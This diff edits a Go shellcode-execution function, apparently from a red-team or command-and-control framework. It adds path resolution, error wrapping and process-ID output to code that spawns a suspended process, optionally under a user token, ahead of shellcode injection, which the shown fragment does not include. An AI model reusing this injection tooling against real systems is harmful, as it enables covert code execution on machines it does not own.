@@ -415,11 +415,6 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 		return stdout, stderr, fmt.Errorf("there  was an error decoding the Base64 string: %s", errDecode)
 	}
 
-	// Verify SpawnTo executable exists
-	if _, err = os.Stat(spawnto); os.IsNotExist(err) {
-		return stdout, stderr, fmt.Errorf("path does not exist: %s\r\n%s", spawnto, err)
-	}
-
 	// Load DLLs and Procedures
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
@@ -434,17 +429,23 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 		return
 	}
 
-	// Convert the program to a LPCWSTR
-	lpApplicationName, err := syscall.UTF16PtrFromString(spawnto)
+	application, err := exec.LookPath(spawnto)
 	if err != nil {
-		err = fmt.Errorf("there was an error converting the application name \"%s\" to LPCWSTR: %s", spawnto, err)
+		err = fmt.Errorf("there was an error resolving the absolute: %s", err)
+		return
+	}
+
+	// Convert the program to a LPCWSTR
+	lpApplicationName, err := syscall.UTF16PtrFromString(application)
+	if err != nil {
+		err = fmt.Errorf("there was an error converting the application name \"%s\" to LPCWSTR: %s", application, err)
 		return
 	}
 
 	// Convert the program to a LPCWSTR
 	lpCommandLine, err := syscall.UTF16PtrFromString(args)
 	if err != nil {
-		stderr = fmt.Sprintf("there was an error converting the application arguments \"%s\" to LPCWSTR: %s", args, err)
+		err = fmt.Errorf("there was an error converting the application arguments \"%s\" to LPCWSTR: %s", args, err)
 		return
 	}
 
@@ -460,13 +461,16 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	if tokens.Token != 0 {
 		err = windows.CreateProcessAsUser(tokens.Token, lpApplicationName, lpCommandLine, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, lpStartupInfo, lpProcessInformation)
 		if err != nil {
+			err = fmt.Errorf("there was an error calling windows.CreateProcessAsUser(): %s", err)
 			return
 		}
+		stdout += fmt.Sprintf("Created %s process with an ID of %d\n", application, lpProcessInformation.ProcessId)
 	} else {
-		errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(spawnto), syscall.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, lpStartupInfo, lpProcessInformation)
+		errCreateProcess := windows.CreateProcess(lpApplicationName, lpCommandLine, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, lpStartupInfo, lpProcessInformation)
 		if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
 			return stdout, stderr, fmt.Errorf("error calling CreateProcess:\r\n%s", errCreateProcess)
 		}
+		stdout += fmt.Sprintf("Created %s process with an ID of %d\n", application, lpProcessInformation.ProcessId)
 	}
 
 	// Allocate memory in child process
